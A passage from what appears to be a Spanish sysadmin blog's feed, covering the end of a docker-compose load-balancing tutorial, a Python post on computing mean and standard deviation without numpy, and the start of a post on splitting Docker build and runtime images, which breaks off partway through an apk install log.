Creating and starting &lt;span class="m"&gt;2&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating and starting &lt;span class="m"&gt;3&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating and starting &lt;span class="m"&gt;4&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para la parte del balanceador, no nos queda mas remedio que reconstruirlo. Por suerte, nuestra imagen se configura con variables de entorno, de forma que &lt;strong&gt;docker-compose&lt;/strong&gt; solo va a levantar un contenedor nuevo, sin el proceso de reconstruir la imagen, que es innecesario.&lt;/p&gt;
&lt;p&gt;Vamos a modificar el &lt;em&gt;docker-compose.yml&lt;/em&gt;, para cambiar la variable de entorno &lt;em&gt;BACKENDS&lt;/em&gt;. Como ya tenemos 4 instancias funcionando, no hay problema por parte del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  frontend:
    build: frontend
    expose:
      - &lt;span class="m"&gt;8080&lt;/span&gt;
  balancer:
    build: balancer
    depends_on:
      - frontend
    links:
      - frontend
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8888:80&amp;quot;&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;composetest_frontend_1:8080,composetest_frontend_2:8080,composetest_frontend_3:8080,composetest_frontend_4:8080
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el servicio de nuevo, y dejamos que &lt;strong&gt;docker-compose&lt;/strong&gt; aplique su buen criterio. Vemos que no va a hacer nada con los &lt;em&gt;frontends&lt;/em&gt; porque no han cambiado, y va a recrear el balanceador, con un tiempo mínimo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose up -d
composetest_frontend_4 is up-to-date
composetest_frontend_2 is up-to-date
composetest_frontend_3 is up-to-date
composetest_frontend_1 is up-to-date
Recreating composetest_balancer_1
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que efectivamente hay nuestros 5 contenedores en marcha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose ps
         Name                       Command               State          Ports         
--------------------------------------------------------------------------------------
composetest_balancer_1   /entrypoint.sh                   Up      &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888-&amp;gt;80/tcp 
composetest_frontend_1   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_2   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_3   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_4   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda admirar como funcionan las peticiones balanceadas, siguiendo el algoritmo &lt;em&gt;round robin&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
7490edd50676
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
63e9d7476267
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
4b6b11513400
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
7490edd50676
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
63e9d7476267
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
4b6b11513400
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="docker-compose"></category><category term="microservicios"></category></entry><entry><title>Python como una calculadora estadística</title><link href="http://www.linuxsysadmin.ml/2016/10/python-como-una-calculadora-estadistica.html" rel="alternate"></link><published>2016-10-17T08:00:00+02:00</published><updated>2016-10-17T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-17:/2016/10/python-como-una-calculadora-estadistica.html</id><summary type="html">&lt;p&gt;El otro día me encontraba en mi trabajo con otra petición muy especial: se necesitaba un &lt;em&gt;check&lt;/em&gt; para &lt;strong&gt;Nagios&lt;/strong&gt; que contara las apariciones de cierto tipo de errores en un fichero de &lt;em&gt;log&lt;/em&gt;. Ese &lt;em&gt;check&lt;/em&gt; debía saltar en función de cuán alejado estaba el valor de las últimas 100 muestras …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día me encontraba en mi trabajo con otra petición muy especial: se necesitaba un &lt;em&gt;check&lt;/em&gt; para &lt;strong&gt;Nagios&lt;/strong&gt; que contara las apariciones de cierto tipo de errores en un fichero de &lt;em&gt;log&lt;/em&gt;. Ese &lt;em&gt;check&lt;/em&gt; debía saltar en función de cuán alejado estaba el valor de las últimas 100 muestras.&lt;/p&gt;
&lt;p&gt;Guardar una muestra de valores en un fichero no supone ningún problema en &lt;strong&gt;Linux&lt;/strong&gt;. Sin embargo, hacer cálculos estadísticos en &lt;strong&gt;bash&lt;/strong&gt; es un suicidio. Eso nos obligaba a utilizar un lenguaje mas elaborado, pero existente en todas las máquinas: &lt;strong&gt;python&lt;/strong&gt;. Sin embargo, el módulo &lt;strong&gt;numpy&lt;/strong&gt; no estaba en todas las máquinas interesadas; instalarlo no era una opción. Así que me tocó programarlo a mí.&lt;/p&gt;
&lt;p&gt;Desempolvando mis apuntes de estadística en forma de &lt;a href="https://en.wikipedia.org/wiki/Standard_deviation"&gt;Wikipedia&lt;/a&gt;, tenemos lo siguiente:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For a finite set of numbers, the standard deviation is found by taking the square root of the average of the squared deviations of the values from their average value.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Para los matemáticos, también hay la fórmula, aunque para mi, con el ejemplo me vale.&lt;/p&gt;
&lt;h2&gt;Un caso concreto&lt;/h2&gt;
&lt;p&gt;Tenemos el conjunto de valores del ejemplo: 2, 4, 4, 4, 5, 5, 7, 9. Vamos a necesitar su valor medio, que es 5 (la suma de los valores entre el número de valores).&lt;/p&gt;
&lt;p&gt;Obtenemos un nuevo conjunto de desviaciones de los valores respecto a la media: (2-5), (4-5), (4-5), (4-5), (5-5), (5-5), (7-5), (9-5). Para resumir, queda -3, -1, -1, -1, 0, 0, 2, 4.&lt;/p&gt;
&lt;p&gt;El siguiente paso es obtener los cuadrados de las desviaciones anteriores: 9, 1, 1, 1, 0, 0, 4, 16.&lt;/p&gt;
&lt;p&gt;De ese conjunto se saca la media y ya tenemos el cuadrado desviación estándar: (9+1+1+1+0+0+4+16)/8 = 32/8 = 4.&lt;/p&gt;
&lt;p&gt;Finalmente hacemos la raíz cuadrada y obtenemos la desviación estándar: 2.&lt;/p&gt;
&lt;h2&gt;Un script que calcule por nosotros&lt;/h2&gt;
&lt;p&gt;Vamos a simplificar el proceso anterior simplificando el proceso con 3 funciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Media&lt;/li&gt;
&lt;li&gt;Cuadrado de la desviación de un valor concreto&lt;/li&gt;
&lt;li&gt;Raíz cuadrada&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La media se utiliza al principio para calcular las desviaciones, y al final, para hacer la media de las desviaciones cuadradas. La otra función va a ser una que nos dé la desviación de un valor al cuadrado, dado su media y el valor mismo.&lt;/p&gt;
&lt;p&gt;Con estas funciones es muy fácil de escribir un código legible, que vamos a guardar en un fichero &lt;em&gt;some_math.py&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;math&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;average&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;stdev&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;avg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;average&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;variance&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;avg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;samples&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;average&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;variance&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Average:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;average&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;StDev:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdev&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solamente nos queda comprobar que funciona, previa concesión de permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ./some_math.py 
Average: 5.0
StDev: 2.0
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Elegante y efectivo...&lt;/p&gt;</content><category term="linux"></category><category term="python"></category><category term="media"></category><category term="desviación estándar"></category></entry><entry><title>Separando el build y el runtime con contenedores Docker</title><link href="http://www.linuxsysadmin.ml/2016/10/separando-el-build-y-el-runtime-con-contenedores-docker.html" rel="alternate"></link><published>2016-10-10T08:00:00+02:00</published><updated>2016-10-10T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-10:/2016/10/separando-el-build-y-el-runtime-con-contenedores-docker.html</id><summary type="html">&lt;p&gt;Cuando montamos un contenedor &lt;strong&gt;Docker&lt;/strong&gt; para servir una aplicación cualquiera, solemos poner un montón de dependencias necesarias solamente para compilar el paquete o para empaquetar sus librerías. Esto supone un gasto innecesario en espacio y en tiempo de ejecución; usando contenedores desechables podemos agilizar este proceso de forma altamente considerable …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando montamos un contenedor &lt;strong&gt;Docker&lt;/strong&gt; para servir una aplicación cualquiera, solemos poner un montón de dependencias necesarias solamente para compilar el paquete o para empaquetar sus librerías. Esto supone un gasto innecesario en espacio y en tiempo de ejecución; usando contenedores desechables podemos agilizar este proceso de forma altamente considerable.&lt;/p&gt;
&lt;p&gt;Para ello vamos a partir de una aplicación simplista hecha con &lt;strong&gt;python&lt;/strong&gt; que podemos encontrar en &lt;a href="https://github.com/Sirtea/autobuilder"&gt;https://github.com/Sirtea/autobuilder&lt;/a&gt;. La idea es que vamos a preparar las dependencias en un contenedor, para luego sacar lo justo y necesario para poner en un contenedor que disponga solamente de lo justo para el &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para simplificar mas todavía, vamos a separar el código base del contenedor, de forma que este pueda ir cambiando modificando solamente un parámetro dado. Vamos a delegar la descarga y compilación del código base a un &lt;em&gt;script&lt;/em&gt;, que no cambie y que permita trabajar con las diferentes versiones de nuestra aplicación.&lt;/p&gt;
&lt;p&gt;Para que todo esto funcione, necesitamos seguir una cantidad mínima de reglas, que van a poderse cumplir independientemente del proyecto o del &lt;em&gt;framework&lt;/em&gt; usado.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;En la base del repositorio hay un &lt;em&gt;requirements.txt&lt;/em&gt; que nos va a indicar las librerías necesarias.&lt;/li&gt;
&lt;li&gt;La aplicación quedará alojada en una carpeta &lt;em&gt;app&lt;/em&gt;, el módulo con la aplicación se va a llamar &lt;em&gt;app&lt;/em&gt; (módulo o &lt;em&gt;package&lt;/em&gt;) y el &lt;em&gt;callable&lt;/em&gt; también se va a llamar &lt;em&gt;app&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;virtualenv&lt;/em&gt; se va aconstruir en &lt;em&gt;/app/env&lt;/em&gt;, para su uso futuro, en tiempo de &lt;em&gt;runtime&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vamos a empezar construyendo una carpeta contenedora de las dos imágenes que vamos a usar, separadas a su vez por otro nivel de carpetas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ tree
.
├── builder
│   ├── build.sh
│   └── Dockerfile
└── runner
    ├── app.ini
    └── Dockerfile

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La imagen de build&lt;/h2&gt;
&lt;p&gt;La filosofía es muy simple: crearemos una imagen que tenga todas las dependencias necesarias para la construcción de la aplicación (en nuestro caso el &lt;em&gt;virtualenv&lt;/em&gt;), y vamos a poner un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;build.sh&lt;/em&gt; que se va a encargar de clonar un repositorio en &lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt; y va a construir una refererencia tambien indicada mediante variables de entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ cat builder/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache py-virtualenv git gcc musl-dev python-dev
COPY build.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;build.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; de &lt;em&gt;build&lt;/em&gt; va a depender bastante de como se prepara nuestra aplicación. En este caso va a clonar el repositorio en una carpeta &lt;em&gt;/build&lt;/em&gt;, y va a copiar la referencia solicitada en una carpeta &lt;em&gt;/app&lt;/em&gt;, que luego va a ser acompañada con un &lt;em&gt;virtualenv&lt;/em&gt;. Puesto que el &lt;em&gt;virtualenv&lt;/em&gt; es dependiente de la localización en el servidor, vamos a usar también &lt;em&gt;/app&lt;/em&gt; en la máquina de &lt;em&gt;runtime&lt;/em&gt;. En este paso es cuando hace falta usar la convención del fichero &lt;em&gt;requirements.txt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ cat builder/build.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

mkdir /app
git clone &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPO&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; /build
&lt;span class="nb"&gt;cd&lt;/span&gt; /build
git archive &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REF&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tar xf - -C /app
virtualenv /app/env
/app/env/bin/pip install -r /app/requirements.txt
tar czf /shared/app.tar.gz -C / app
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que el producto acabado quede comprimido en la carpeta &lt;em&gt;/shared&lt;/em&gt;. Personalmente he utilizado un fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero se podría haber utilizado ficheros &lt;em&gt;.deb&lt;/em&gt;, &lt;em&gt;.rpm&lt;/em&gt; o lo que hiciera falta.&lt;/p&gt;
&lt;p&gt;Falta construir la imagen a partir de los ficheros dados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/builder$ docker build -t builder .
Sending build context to Docker daemon &lt;span class="m"&gt;3&lt;/span&gt;.072 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
&lt;span class="m"&gt;3&lt;/span&gt;.4: Pulling from library/alpine
Digest: sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache py-virtualenv git gcc musl-dev python-dev
 ---&amp;gt; Running in 36ab40f2fbc6
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r10 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gmp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.1.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing isl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.14.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libgomp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libatomic &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libgcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconf &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.9.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconfig &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.25-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing mpfr3 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing mpc1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libstdc++ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ca-certificates &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20160104&lt;/span&gt;-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libssh2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.7.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libcurl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.50.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;18&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;19&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing git &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.8.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;21&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl-utils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r10 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;22&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing musl-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;23&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;26&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
